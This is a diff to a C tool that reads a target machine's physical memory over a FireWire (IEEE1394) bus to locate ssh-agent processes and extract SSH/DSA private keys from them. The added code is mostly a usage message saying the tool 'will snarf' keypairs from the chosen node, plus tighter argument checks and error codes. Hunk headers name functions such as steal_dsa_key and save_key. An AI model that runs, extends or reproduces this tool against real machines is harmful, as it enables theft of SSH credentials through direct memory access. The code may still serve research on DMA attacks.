@@ -188,6 +188,8 @@ char* resolve_env(linear_handle h, char* envvar)
 }}}
 
 
+
+
 // fix a remote bignum to a local bignum:
 // copy all important internal data of struct bignum_st
 //
@@ -502,6 +504,8 @@ int steal_dsa_key(linear_handle lin, Key* key)
 				printf("\t\t\t"TERM_RED"(WARN)"TERM_RESET" q is not 160 bits but %d bits long!\n", len);
 			else
 				printf("\t\t\t"TERM_GREEN"(ok)"TERM_RESET"   q is 160 bits long.\n");
+			// q: prime-factor of p-1?
+
 
 			// pub_key:
 			BN_mod_exp(o, key->dsa->g, key->dsa->priv_key, key->dsa->p, ctx);
@@ -594,6 +598,9 @@ void save_key(linear_handle lin, char* key_comment, Key* key)
 	free(comment);
 	free(username);
   }}}
+
+
+
 
 // attack an ssh-agent's address space:
 // 	create a string ala '$HOME/.ssh/'
@@ -735,6 +742,32 @@ void check_ssh_agent(linear_handle lin)
 	free(heap);
 }}}
 
+
+
+
+// show usage info
+void usage(char* argv0)
+{{{
+	printf(	"%s <"TERM_YELLOW"node-id"TERM_RESET"> ["TERM_BLUE"-t"TERM_RESET"]\n"
+		"\n"
+		"i will snarf ssh public/private keypairs from all ssh-agents i can\n"
+		"find on the system hanging on your IEEE1394 bus with the given\n"
+		TERM_YELLOW"node-id"TERM_RESET" the node-id should be an integer in [0..63]; you can use\n"
+		"``1394csrtool -s'' or ``gscanbus'' or other bus-scanning tools ton\n"
+		"identify the attack-target.\n"
+		"\n"
+		TERM_RED"be aware"TERM_RESET", that i only operate on IA32 linux with no more than 4GB\n"
+		"of RAM and that i only search for ``ssh-agent'' processes and keys\n"
+		"loaded into them with the absolute path of ``$HOME/.ssh''.\n"
+		"\n"
+		"if you specify ``"TERM_BLUE"-t"TERM_RESET"'' as second parameter ("TERM_RED"and only as 2nd"TERM_RESET"), i will\n"
+		"try to verify that the snarfed keypair is ok.\n"
+		"\n"
+		,
+		argv0
+		);
+}}}
+
 // will scan the targets memory for pagedirs,
 // for each found: use pagedir for linear mapping. 
 //                 in linear address-space: resolve process name
@@ -747,33 +780,45 @@ int main(int argc, char**argv)
 	addr_t pn;
 	char page[4096];
 	float prob;
+	int res;
 
 	// create and associate a physical source to /dev/mem
 	phy = physical_new_handle();
 	if(!phy) {
 		printf("physical handle is null\n");
-		return -2;
-	}
-	if(argc != 2 && argc != 3) {
-		printf("please give targets nodeid as first parameter;\n"
-		       "you may give -t as second parameter to test captured keys for validity\n"
-		       "(may increase attack-time by several seconds)\n");
 		return -1;
 	}
+	if(argc != 2 && argc != 3) {
+		usage(argv[0]);
+		return -2;
+	}
 
-	if(0 == strcmp(argv[2], "-t"))
-		test_keys = 1;
+	if(argc == 3) {
+		if(0 == strcmp(argv[2], "-t")) {
+			test_keys = 1;
+		} else {
+			usage(argv[0]);
+			return -2;
+		}
+	}
 
 	phy_data.ieee1394.raw1394handle = raw1394_new_handle();
         if(!phy_data.ieee1394.raw1394handle) {
                 printf("failed to open raw1394\n");
-                return -1;
+                return -3;
         }
 	if(raw1394_set_port(phy_data.ieee1394.raw1394handle, 0)) {
 		printf("raw1394 failed to set port\n");
-		return -4;
+		return -3;
 	}
-	phy_data.ieee1394.raw1394target = atoi(argv[1]) + NODE_OFFSET;
+	res = atoi(argv[1]);
+	if((res > 63) || (res < 0)) {
+		printf("nodeid too big!\n\n");
+		usage(argv[0]);
+		return -2;
+	}
+	phy_data.ieee1394.raw1394target = res + NODE_OFFSET;
+		
 	printf("using target %d\n", phy_data.ieee1394.raw1394target - NODE_OFFSET);
 	printf("associating physical source with raw1394\n"); fflush(stdout);
 	if(physical_handle_associate(phy, physical_ieee1394, &phy_data, 4096)) {
@@ -786,7 +831,7 @@ int main(int argc, char**argv)
 	printf("assoc lin handle..\n"); fflush(stdout);
 	if(linear_handle_associate(lin, phy, arch_ia32)) {
 		printf("failed to associate lin ia32!\n");
-		return -5;
+		return -1;
 	}
 
 	printf("keys:\t\t.    -   checked another 0x80 pages\n"
@@ -802,7 +847,13 @@ int main(int argc, char**argv)
 		fflush(stdout);
 		if((pn%0x80) == 0)
 			putchar('.');
-		if(linear_is_pagedir_fast(lin, pn)) {
+		res = linear_is_pagedir_fast(lin, pn);
+		if(res < 0) {
+			printf("\n\n" TERM_RED "failed to read page 0x%05llx. aborting." TERM_RESET "\n", pn);
+			break;
+		}
+
+		if(res) {
 			// load page
 			physical_read_page(phy, pn, page);
 			prob = linear_is_pagedir_probability(lin, page);
